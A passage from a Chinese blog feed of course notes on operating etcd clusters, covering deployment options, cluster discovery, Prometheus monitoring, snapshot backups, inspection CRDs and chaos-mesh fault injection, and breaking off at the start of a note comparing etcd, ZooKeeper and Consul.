title="集群部署"></a>集群部署</h2><p>要想使用etcd集群，我们面对的第一个问题是如何选择合适的方案去部署etcd集群。</p><p>首先是计算资源的选择，它本质上就是计算资源的交付演进史，分别如下：</p><ul><li>物理机；</li><li>虚拟机；</li><li>裸容器（如Docker实例）；</li><li>Kubernetes容器编排。</li></ul><p><strong>物理机资源交付慢、成本高、扩缩容流程费时</strong>，<strong>一般情况下大部分业务团队不再考虑物理机</strong>，除非是超大规模的上万个节点的Kubernetes集群，对CPU、内存、网络资源有着极高诉求。</p><p>虚拟机是目前各个云厂商售卖的主流实例，无论是基于KVM还是Xen实现，都具有良好的稳定性、隔离性，支持故障热迁移，可弹性伸缩，被etcd、数据库等存储业务大量使用。</p><p>在基于物理机和虚拟机的部署方案中，可以使用ansible、puppet等自动运维工具，构建标准、自动化的etcd集群搭建、扩缩容流程。基于ansible部署etcd集群可以拆分成以下若干个任务:</p><ul><li>下载及安装etcd二进制到指定目录；</li><li>将etcd加入systemd等服务管理；</li><li>为etcd增加配置文件，合理设置相关参数；</li><li>为etcd集群各个节点生成相关证书，构建一个安全的集群；</li><li>组建集群版（静态配置、动态配置，发现集群其他节点）；</li><li>开启etcd服务，启动etcd集群。</li></ul><p>详细可以参考digitalocean <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-and-secure-an-etcd-cluster-with-ansible-on-ubuntu-18-04">这篇博客文章</a>，它介绍了如何使用ansible去部署一个安全的etcd集群，并给出了对应的yaml任务文件。</p><p><strong>容器化部署则具有极速的交付效率、更灵活的资源控制、更低的虚拟化开销等一系列优点</strong>。自从Docker诞生后，容器化部署就风靡全球。有的业务直接使用裸Docker容器来跑etcd集群。然而裸Docker容器不具备调度、故障自愈、弹性扩容等特性，存在较大局限性。</p><p>随后为了解决以上问题，诞生了以Kubernetes、Swarm为首的容器编排平台，Kubernetes成为了容器编排之战中的王者，大量业务使用Kubernetes来部署etcd、ZooKeeper等有状态服务。在开源社区中，也诞生了若干个etcd的Kubernetes容器化解决方案，分别如下：</p><ul><li>etcd-operator；</li><li>bitnami etcd&#x2F;statefulset；</li><li>etcd-cluster-operator；</li><li>openshit&#x2F;cluster-etcd-operator；</li><li>kubeadm。</li></ul><p><a href="https://github.com/coreos/etcd-operator">etcd-operator</a> 目前已处于Archived状态，无人维护，基本废弃。同时它是基于裸Pod实现的，要做好各种备份。在部分异常情况下存在集群宕机、数据丢失风险，我仅建议你使用它的数据备份etcd-backup-operator。</p><p><strong><a href="https://bitnami.com/stack/etcd/helm">bitnami etcd</a> 提供了一个helm包一键部署etcd集群，支持各个云厂商，支持使用PV、PVC持久化存储数据，底层基于StatefulSet实现，较稳定。目前不少开源项目使用的是它。</strong></p><p>可以通过如下helm命令，快速在Kubernete集群中部署一个etcd集群。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">helm repo add bitnami https:<span class="hljs-comment">//charts.bitnami.com/bitnami</span><br>helm install my-release bitnami/etcd<br><br></code></pre></td></tr></table></figure><p><a href="https://github.com/improbable-eng/etcd-cluster-operator">etcd-cluster-operator</a> 和openshit&#x2F; <a href="https://github.com/openshift/cluster-etcd-operator">cluster-etcd-operator</a> 比较小众，目前star不多，但是有相应的开发者维护，你可参考下它们的实现思路，与etcd-operator基于Pod、bitnami etcd基于Statefulset实现不一样的是，它们是基于ReplicaSet和Static Pod实现的。</p><p><strong>最后介绍的是 <a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/setup-ha-etcd-with-kubeadm/">kubeadm</a>，它是Kubernetes集群中的etcd高可用部署方案的提供者，kubeadm是基于Static Pod部署etcd集群的。Static Pod相比普通Pod有其特殊性，它是直接由节点上的kubelet进程来管理，无需通过kube-apiserver。</strong></p><p>创建Static Pod方式有两种，分别是配置文件和HTTP。kubeadm使用的是配置文件，也就是在kubelet监听的静态Pod目录下（一般是&#x2F;etc&#x2F;kubernetes&#x2F;manifests）放置相应的etcd Pod YAML文件即可，如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/d7/05/d7c28814d3f83ff4ef474df72b10b305.png?wh=1920*1007" alt="img"></p><p>注意在这种部署方式中，部署etcd的节点需要部署docker、kubelet、kubeadm组件，依赖较重。</p><h2 id="集群组建"><a href="#集群组建" class="headerlink" title="集群组建"></a>集群组建</h2><p>聊完etcd集群部署的几种模式和基本原理后，我们接下来看看在实际部署过程中最棘手的部分，那就是集群组建。因为集群组建涉及到etcd成员管理的原理和节点发现机制。</p><p>要特别注意，当变更集群成员节点时，节点的initial-cluster-state参数的取值可以是new或existing。</p><ul><li>new，一般用于初始化启动一个新集群的场景。当设置成new时，它会根据initial-cluster-token、initial-cluster等参数信息计算集群ID、成员ID信息。</li><li>existing，表示etcd节点加入一个已存在的集群，它会根据peerURLs信息从Peer节点获取已存在的集群ID信息，更新自己本地配置、并将本身节点信息发布到集群中。</li></ul><p>那么当要组建一个三节点的etcd集群的时候，有哪些方法呢?</p><p>在etcd中，无论是Leader选举还是日志同步，都涉及到与其他节点通信。因此组建集群的第一步得知道集群总成员数、各个成员节点的IP地址等信息。</p><p>这个过程就是发现（Discovery）。目前etcd主要通过两种方式来获取以上信息，分别是 <strong>static configuration</strong> 和 <strong>dynamic service discovery</strong>。</p><p><strong>static configuration</strong> 是指集群总成员节点数、成员节点的IP地址都是已知、固定的，根据我们上面介绍的initial-cluster-state原理，有如下两个方法可基于静态配置组建一个集群。</p><ul><li>方法1，三个节点的initial-cluster-state都配置为new，静态启动，initial-cluster参数包含三个节点信息即可，详情你可参考 <a href="https://etcd.io/docs/v3.4.0/op-guide/clustering/">社区文档</a>。</li><li>方法2，第一个节点initial-cluster-state设置为new，独立成集群，随后第二和第三个节点都为existing，通过扩容的方式，不断加入到第一个节点所组成的集群中。</li></ul><p>如果成员节点信息是未知的，你可以通过 <strong>dynamic service discovery</strong> 机制解决。</p><p>etcd社区还提供了通过公共服务来发现成员节点信息，组建集群的方案。它的核心是集群内的各个成员节点向公共服务注册成员地址等信息，各个节点通过公共服务来发现彼此，可以参考 <a href="https://etcd.io/docs/v3.4.0/dev-internal/discovery_protocol/">官方详细文档。</a></p><h2 id="监控及告警体系"><a href="#监控及告警体系" class="headerlink" title="监控及告警体系"></a>监控及告警体系</h2><p>当我们把集群部署起来后，在业务开始使用之前，部署监控是必不可少的一个环节，它是保障业务稳定性，提前发现风险、隐患点的重要核心手段。那么要如何快速监控你的etcd集群呢？</p><p>正如之前在14和15里和你介绍延时、内存时所提及的，etcd提供了丰富的metrics来展示整个集群的核心指标、健康度。metrics按模块可划分为磁盘、网络、MVCC事务、gRPC RPC、etcdserver。</p><p>磁盘相关的metrics及含义如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/7b/a5/7b3df60d26f5363e36100525a44472a5.png?wh=1920*616" alt="img"></p><p>网络相关的metrics及含义如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/da/32/da489a9796a016dc2yy99e101d9ab832.png?wh=1920*529" alt="img"></p><p>mvcc相关的较多，我在下图中列举了部分其含义，如下所示。</p><p><img src="https://static001.geekbang.org/resource/image/d1/51/d17446f657b110afd874yyea87176051.png?wh=1920*564" alt="img"></p><p>etcdserver相关的如下，集群是否有leader、堆积的proposal数等都在此模块。</p><p><img src="https://static001.geekbang.org/resource/image/cb/6e/cbb95c525a6748bfaee48e95ca622f6e.png?wh=1920*759" alt="img"></p><p>更多metrics，可以通过如下方法查看。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> <span class="hljs-number">127.0.0.1:2379</span>/metrics<br><br></code></pre></td></tr></table></figure><p>了解常见的metrics后，我们只需要配置Prometheus服务，采集etcd集群的2379端口的metrics路径。</p><p>采集的方案一般有两种， <a href="https://etcd.io/docs/v3.4.0/op-guide/monitoring/">静态配置</a> 和动态配置。</p><p>静态配置是指添加待监控的etcd target到Prometheus配置文件，如下所示。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c">global:<br>  scrape_interval: <span class="hljs-number">10</span>s<br>scrape_configs:<br>  - job_name: test-etcd<br>    static_configs:<br>    - targets:<br> [&#x27;10.240.0.32:<span class="hljs-number">2379</span>&#x27;,&#x27;10.240.0.33:<span class="hljs-number">2379</span>&#x27;,&#x27;10.240.0.34:<span class="hljs-number">2379</span>&#x27;]<br><br></code></pre></td></tr></table></figure><p>静态配置的缺点是每次新增集群、成员变更都需要人工修改配置，而动态配置就可解决这个痛点。</p><p>动态配置是通过Prometheus-Operator的提供ServiceMonitor机制实现的，当想采集一个etcd实例时，若etcd服务部署在同一个Kubernetes集群，只需要通过Kubernetes的API创建一个如下的ServiceMonitor资源即可。若etcd集群与Promehteus-Operator不在同一个集群，你需要去创建、更新对应的集群Endpoint。</p><p>那Prometheus是如何知道该采集哪些服务的metrics信息呢?</p><p>答案ServiceMonitor资源通过Namespace、Labels描述了待采集实例对应的Service Endpoint。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">apiVersion:</span> monitoring.coreos.com/v1<br><span class="hljs-symbol">kind:</span> ServiceMonitor<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  name:</span> prometheus-prometheus-oper-kube-etcd<br><span class="hljs-symbol">  namespace:</span> monitoring<br><span class="hljs-symbol">spec:</span><br><span class="hljs-symbol">  endpoints:</span><br>  - bearerTokenFile: <span class="hljs-keyword">/var/</span>run<span class="hljs-keyword">/secrets/</span>kubernetes.io<span class="hljs-keyword">/serviceaccount/</span>token<br><span class="hljs-symbol">    port:</span> http-metrics<br><span class="hljs-symbol">    scheme:</span> https<br><span class="hljs-symbol">    tlsConfig:</span><br><span class="hljs-symbol">      caFile:</span> <span class="hljs-keyword">/etc/</span>prometheus<span class="hljs-keyword">/secrets/</span>etcd-certs/ca.crt<br><span class="hljs-symbol">      certFile:</span> <span class="hljs-keyword">/etc/</span>prometheus<span class="hljs-keyword">/secrets/</span>etcd-certs/client.crt<br><span class="hljs-symbol">      insecureSkipVerify:</span> true<br><span class="hljs-symbol">      keyFile:</span> <span class="hljs-keyword">/etc/</span>prometheus<span class="hljs-keyword">/secrets/</span>etcd-certs/client.key<br><span class="hljs-symbol">  jobLabel:</span> jobLabel<br><span class="hljs-symbol">  namespaceSelector:</span><br><span class="hljs-symbol">    matchNames:</span><br>    - kube-system<br><span class="hljs-symbol">  selector:</span><br><span class="hljs-symbol">    matchLabels:</span><br><span class="hljs-symbol">      app:</span> prometheus-operator-kube-etcd<br><span class="hljs-symbol">      release:</span> prometheus<br><br></code></pre></td></tr></table></figure><p>采集了metrics监控数据后，下一步就是要基于metrics监控数据告警了。可以通过Prometheus和 <a href="https://github.com/prometheus/alertmanager">Alertmanager</a> 组件实现，那你应该为哪些核心指标告警呢？</p><p>当然是影响集群可用性的最核心的metric。比如是否有Leader、Leader切换次数、WAL和事务操作延时。etcd社区提供了一个 <a href="https://github.com/etcd-io/etcd/blob/v3.4.9/Documentation/op-guide/etcd3_alert.rules">丰富的告警规则</a>，你可以参考下。</p><p>最后，为了方便查看etcd集群运行状况和提升定位问题的效率，可以基于采集的metrics配置个 <a href="https://github.com/etcd-io/etcd/blob/v3.4.9/Documentation/op-guide/grafana.json">grafana可视化面板</a>。下面列出了集群是否有Leader、总的key数、总的watcher数、出流量、WAL持久化延时的可视化面板。</p><p><img src="https://static001.geekbang.org/resource/image/a3/9f/a3b42d1e81dd706897edf32ecbc65f9f.png?wh=848*482" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/d3/7d/d3bc1f984ea8b2e301471ef2923d1b7d.png?wh=1306*366" alt="img"><img src="https://static001.geekbang.org/resource/image/yy/9f/yy73b00dd4d48d473c1d900c96dd0a9f.png?wh=1308*358" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/2d/25/2d28317yyc38957ae2125e460b83f825.png?wh=1282*362" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/9c/b9/9c471d05b1452c4f0aa8yy24c79915b9.png?wh=1268*418" alt="img"></p><h2 id="备份及还原"><a href="#备份及还原" class="headerlink" title="备份及还原"></a>备份及还原</h2><p>监控及告警就绪后，就可以提供给业务在生产环境使用了吗？</p><p>当然不行，数据是业务的安全红线，所以还需要做好最核心的数据备份工作。</p><p>如何做呢？</p><p>主要有以下方法，首先是通过etcdctl snapshot命令行人工备份。在发起重要变更的时候，你可以通过如下命令进行备份，并查看快照状态。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">ETCDCTL_API</span>=3 etcdctl --endpoints <span class="hljs-variable">$ENDPOINT</span><br>snapshot save snapshotdb<br><span class="hljs-attribute">ETCDCTL_API</span>=3 etcdctl <span class="hljs-attribute">--write-out</span>=table snapshot status snapshotdb<br><br></code></pre></td></tr></table></figure><p>其次是通过定时任务进行定时备份，建议至少每隔1个小时备份一次。</p><p>然后是通过 <a href="https://github.com/coreos/etcd-operator/blob/master/doc/user/walkthrough/backup-operator.md#:~:text=etcd%20backup%20operator%20backs%20up,storage%20such%20as%20AWS%20S3.">etcd-backup-operator</a> 进行自动化的备份，类似ServiceMonitor，你可以通过创建一个备份任务CRD实现。CRD如下：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">apiVersion:</span> <span class="hljs-string">&quot;etcd.database.coreos.com/v1beta2&quot;</span><br><span class="hljs-symbol">kind:</span> <span class="hljs-string">&quot;EtcdBackup&quot;</span><br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  name:</span> example-etcd-cluster-periodic-backup<br><span class="hljs-symbol">spec:</span><br><span class="hljs-symbol">  etcdEndpoints:</span> [<span class="hljs-params">&lt;etcd-cluster-endpoints&gt;</span>]<br><span class="hljs-symbol">  storageType:</span> S3<br><span class="hljs-symbol">  backupPolicy:</span><br>    <span class="hljs-meta"># 0 &gt; enable periodic backup</span><br><span class="hljs-symbol">    backupIntervalInSecond:</span> <span class="hljs-number">125</span><br><span class="hljs-symbol">    maxBackups:</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">  s3:</span><br>    <span class="hljs-meta"># The format of <span class="hljs-string">&quot;path&quot;</span> must be: <span class="hljs-string">&quot;&lt;s3-bucket-name&gt;/&lt;path-to-backup-file&gt;&quot;</span></span><br>    <span class="hljs-meta"># e.g: <span class="hljs-string">&quot;mybucket/etcd.backup&quot;</span></span><br><span class="hljs-symbol">    path:</span> <span class="hljs-params">&lt;full-s3-path&gt;</span><br><span class="hljs-symbol">    awsSecret:</span> <span class="hljs-params">&lt;aws-secret&gt;</span><br><br></code></pre></td></tr></table></figure><p>最后可以通过给etcd集群增加Learner节点，实现跨地域热备。因Learner节点属于非投票成员的节点，因此它并不会影响你集群的性能。它的基本工作原理是当Leader收到写请求时，它会通过Raft模块将日志同步给Learner节点。你需要注意的是，在etcd 3.4中目前只支持1个Learner节点，并且只允许串行读。</p><h2 id="巡检"><a href="#巡检" class="headerlink" title="巡检"></a>巡检</h2><p>完成集群部署、了解成员管理、构建好监控及告警体系并添加好定时备份策略后，这时终于可以放心给业务使用了。然而在后续业务使用过程中，你可能会遇到各类问题，而这些问题很可能是metrics监控无法发现的，比如如下：</p><ul><li>etcd集群因重启进程、节点等出现数据不一致；</li><li>业务写入大 key-value 导致 etcd 性能骤降；</li><li>业务异常写入大量key数，稳定性存在隐患；</li><li>业务少数 key 出现写入 QPS 异常，导致 etcd 集群出现限速等错误；</li><li>重启、升级 etcd 后，需要人工从多维度检查集群健康度；</li><li>变更 etcd 集群过程中，操作失误可能会导致 etcd 集群出现分裂；</li></ul><p>……</p><p>因此为了实现高效治理etcd集群，我们可将这些潜在隐患总结成一个个自动化检查项，比如：</p><ul><li>如何高效监控 etcd 数据不一致性？</li><li>如何及时发现大 key-value?</li><li>如何及时通过监控发现 key 数异常增长？</li><li>如何及时监控异常写入 QPS?</li><li>如何从多维度的对集群进行自动化的健康检测，更安心变更？</li><li>……</li></ul><p>如何将这些 etcd 的最佳实践策略反哺到现网大规模 etcd 集群的治理中去呢？</p><p>答案就是<strong>巡检</strong>。</p><p>参考ServiceMonitor和EtcdBackup机制，同样可以通过CRD的方式描述此巡检任务，然后通过相应的Operator实现此巡检任务。比如下面就是一个数据一致性巡检的YAML文件，其对应的Operator组件会定时、并发检查其关联的etcd集群各个节点的key差异数。</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">apiVersion:</span> etcd.cloud.tencent.com/v1beta1<br><span class="hljs-symbol">kind:</span> EtcdMonitor<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">creationTimestamp:</span> <span class="hljs-string">&quot;2020-06-15T12:19:30Z&quot;</span><br><span class="hljs-symbol">generation:</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">labels:</span><br><span class="hljs-symbol">clusterName:</span> gz-qcloud-etcd-<span class="hljs-number">03</span><br><span class="hljs-symbol">region:</span> gz<br><span class="hljs-symbol">source:</span> etcd-life-cycle-<span class="hljs-keyword">operator</span><br><span class="hljs-symbol">name:</span> gz-qcloud-etcd-<span class="hljs-number">03</span>-etcd-node-<span class="hljs-keyword">key</span>-diff<br><span class="hljs-symbol">namespace:</span> gz<br><span class="hljs-symbol">spec:</span><br><span class="hljs-symbol">clusterId:</span> gz-qcloud-etcd-<span class="hljs-number">03</span><br><span class="hljs-symbol">metricName:</span> etcd-node-<span class="hljs-keyword">key</span>-diff<br><span class="hljs-symbol">metricProviderName:</span> cruiser<br><span class="hljs-symbol">name:</span> gz-qcloud-etcd-<span class="hljs-number">03</span><br><span class="hljs-symbol">productName:</span> tke<br><span class="hljs-symbol">region:</span> gz<br><span class="hljs-symbol">status:</span><br><span class="hljs-symbol">records:</span><br>- endTime: <span class="hljs-string">&quot;2021-02-25T11:22:26Z&quot;</span><br><span class="hljs-symbol">message:</span> collectEtcdNodeKeyDiff,etcd cluster gz-qcloud-etcd-<span class="hljs-number">03</span>,total <span class="hljs-keyword">key</span> num <span class="hljs-built_in">is</span><br><span class="hljs-number">122143</span>,nodeKeyDiff <span class="hljs-built_in">is</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">startTime:</span> <span class="hljs-string">&quot;2021-02-25T12:39:28Z&quot;</span><br><span class="hljs-symbol">updatedAt:</span> <span class="hljs-string">&quot;2021-02-25T12:39:28Z&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="高可用及自愈"><a href="#高可用及自愈" class="headerlink" title="高可用及自愈"></a>高可用及自愈</h2><p>通过以上机制，我们已经基本建设好一个高可用的etcd集群运维体系了。最后提供几个集群高可用及自愈的小建议：</p><ul><li>若etcd集群性能已满足业务诉求，可容忍一定的延时上升，建议将etcd集群做高可用部署，比如对3个节点来说，把每个节点部署在独立的可用区，可容忍任意一个可用区故障。</li><li>逐步尝试使用Kubernetes容器化部署etcd集群。当节点出现故障时，能通过Kubernetes的自愈机制，实现故障自愈。</li><li>设置合理的db quota值，配置合理的压缩策略，避免集群db quota满从而导致集群不可用的情况发生。</li></ul><h2 id="混沌工程"><a href="#混沌工程" class="headerlink" title="混沌工程"></a>混沌工程</h2><p>在使用etcd的过程中，你可能会遇到磁盘、网络、进程异常重启等异常导致的故障。如何快速复现相关故障进行问题定位呢？</p><p>答案就是混沌工程。一般常见的异常我们可以分为如下几类：</p><ul><li>磁盘IO相关的。比如模拟磁盘IO延时上升、IO操作报错。之前遇到的一个底层磁盘硬件异常导致IO延时飙升，最终触发了etcd死锁的Bug，我们就是通过模拟磁盘IO延时上升后来验证的。</li><li>网络相关的。比如模拟网络分区、网络丢包、网络延时、包重复等。</li><li>进程相关的。比如模拟进程异常被杀、重启等。之前遇到的一个非常难定位和复现的数据不一致Bug，我们就是通过注入进程异常重启等故障，最后成功复现。</li><li>压力测试相关的。比如模拟CPU高负载、内存使用率等。</li></ul><p>开源社区在混沌工程领域诞生了若干个优秀的混沌工程项目，如chaos-mesh、chaos-blade、litmus。这里重点介绍下 <a href="https://github.com/chaos-mesh/chaos-mesh">chaos-mesh</a>，它是基于Kubernetes实现的云原生混沌工程平台，下图是其架构图（引用自社区）。</p><p><img src="https://static001.geekbang.org/resource/image/b8/a7/b87d187ea2ab60d824223662fd6033a7.png?wh=1920*1287" alt="img"></p><p>为了实现以上异常场景的故障注入，chaos-mesh定义了若干种资源类型，分别如下：</p><ul><li>IOChaos，<strong>用于模拟文件系统相关的IO延时和读写错误等。</strong></li><li>NetworkChaos，<strong>用于模拟网络延时、丢包等。</strong></li><li>PodChaos，<strong>用于模拟业务Pod异常，比如Pod被杀、Pod内的容器重启等。</strong></li><li>StressChaos，<strong>用于模拟CPU和内存压力测试。</strong></li></ul><p>当你希望给etcd Pod注入一个磁盘IO延时的故障时，只需要创建此YAML文件就好。</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">apiVersion</span><span class="hljs-punctuation">:</span> <span class="hljs-string">chaos-mesh.org/v1alpha1</span><br><span class="hljs-attribute">kind</span><span class="hljs-punctuation">:</span> <span class="hljs-string">IoChaos</span><br><span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">io-delay-example</span><br><span class="hljs-attribute">spec</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">action</span><span class="hljs-punctuation">:</span> <span class="hljs-string">latency</span><br>  <span class="hljs-attribute">mode</span><span class="hljs-punctuation">:</span> <span class="hljs-string">one</span><br>  <span class="hljs-attribute">selector</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">labelSelectors</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">app</span><span class="hljs-punctuation">:</span> <span class="hljs-string">etcd</span><br>  <span class="hljs-attribute">volumePath</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/var/run/etcd</span><br>  <span class="hljs-attribute">path</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;/var/run/etcd/**/*&#x27;</span><br>  <span class="hljs-attribute">delay</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;100ms&#x27;</span><br>  <span class="hljs-attribute">percent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">50</span><br>  <span class="hljs-attribute">duration</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;400s&#x27;</span><br>  <span class="hljs-attribute">scheduler</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">cron</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;@every 10m&#x27;</span><br><br></code></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>首先通过从集群部署、集群组建、监控及告警体系、备份、巡检、高可用、混沌工程几个维度，深入介绍了如何构建一个高可靠的etcd集群运维体系。</p><p>在集群部署上，当你的业务集群规模非常大、对稳定性有着极高的要求时，推荐使用大规格、高性能的物理机、虚拟机独占部署，并且使用ansible等自动化运维工具，进行标准化的操作etcd，避免人工一个个修改操作。</p><p>对容器化部署来说，Kubernetes场景推荐你使用kubeadm，其他场景可考虑分批、逐步使用bitnami提供的etcd helm包，它是基于statefulset、PV、PVC实现的，各大云厂商都广泛支持，建议在生产环境前，多验证各个极端情况下的行为是否符合你的预期。</p><p>在集群组建上，各个节点需要一定机制去发现集群中的其他成员节点，主要可分为 <strong>static configuration</strong> 和 <strong>dynamic service discovery</strong>。</p><p>static configuration是指集群中各个成员节点信息是已知的，dynamic service discovery是指可以通过服务发现组件去注册自身节点信息、发现集群中其他成员节点信息。另外我和你介绍了重要参数initial-cluster-state的含义，它也是影响集群组建的一个核心因素。</p><p>在监控及告警体系上，介绍了etcd网络、磁盘、etcdserver、gRPC核心的metrics。通过修改Prometheues配置文件，添加etcd target，就可以方便的采集etcd的监控数据。然后介绍了ServiceMonitor机制，可通过它实现动态新增、删除、修改待监控的etcd实例，灵活的、高效的采集etcd Metrcis。</p><p>备份及还原上，重点介绍了etcd snapshot命令，etcd-backup-operator的备份任务CRD机制，推荐使用后者。</p><p>最后是巡检、混沌工程，它能帮助我们高效治理etcd集群，及时发现潜在隐患，低成本、快速的复现Bug和故障等。</p><p>简单介绍下：etcd一站式治理平台kstone. </p><p>Kstone 是一个针对 etcd 的全方位运维解决方案，提供集群管理（关联已有集群、创建新集群等)、监控、备份、巡检、数据迁移、数据可视化、智能诊断等一系列特性。 Kstone 将帮助你高效管理etcd集群，显著降低运维成本、及时发现潜在隐患、提升k8s etcd存储的稳定性和用户体验。 <a href="https://github.com/tkestack/kstone,%E3%80%82">https://github.com/tkestack/kstone,。</a></p><p><img src="https://static001.geekbang.org/resource/image/7b/28/7b54b6ca9134c130bf3940c7db497928.png?wh=1920*1177" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>23.选型：etcd/ZooKeeper/Consul等我们该如何选择？</title>
    <link href="/2022/10/15/23-%E9%80%89%E5%9E%8B%EF%BC%9Aetcd-ZooKeeper-Consul%E7%AD%89%E6%88%91%E4%BB%AC%E8%AF%A5%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%EF%BC%9F/"/>
    <url>/2022/10/15/23-%E9%80%89%E5%9E%8B%EF%BC%9Aetcd-ZooKeeper-Consul%E7%AD%89%E6%88%91%E4%BB%AC%E8%AF%A5%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="23-选型：etcd-x2F-ZooKeeper-x2F-Consul等我们该如何选择？"><a href="#23-选型：etcd-x2F-ZooKeeper-x2F-Consul等我们该如何选择？" class="headerlink" title="23.选型：etcd&#x2F;ZooKeeper&#x2F;Consul等我们该如何选择？"></a>23.选型：etcd&#x2F;ZooKeeper&#x2F;Consul等我们该如何选择？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>在软件开发过程中，当我们需要解决配置、服务发现、分布式锁等业务痛点，在面对 <a href="https://github.com/etcd-io/etcd">etcd</a>、 <a href="https://github.com/apache/zookeeper">ZooKeeper</a>、 <a href="https://github.com/hashicorp/consul">Consul</a>、 <a href="https://github.com/alibaba/nacos">Nacos</a> 等一系列候选开源项目时，我们应该如何结合自己的业务场景，选择合适的分布式协调服务呢？</p><p>今天聊聊主要分布式协调服务的对比。将从基本架构、共识算法、数据模型、重点特性、容灾能力等维度出发，了解主要分布式协调服务的基本原理和彼此之间的差异性。</p><h2 id="基本架构及原理"><a href="#基本架构及原理" class="headerlink" title="基本架构及原理"></a>基本架构及原理</h2><p>在详细和你介绍对比etcd、ZooKeeper、Consul特性之前，我们先从整体架构上来了解一下各开源项目的核心架构及原理。</p><h3 id="etcd架构及原理"><a href="#etcd架构及原理" class="headerlink" 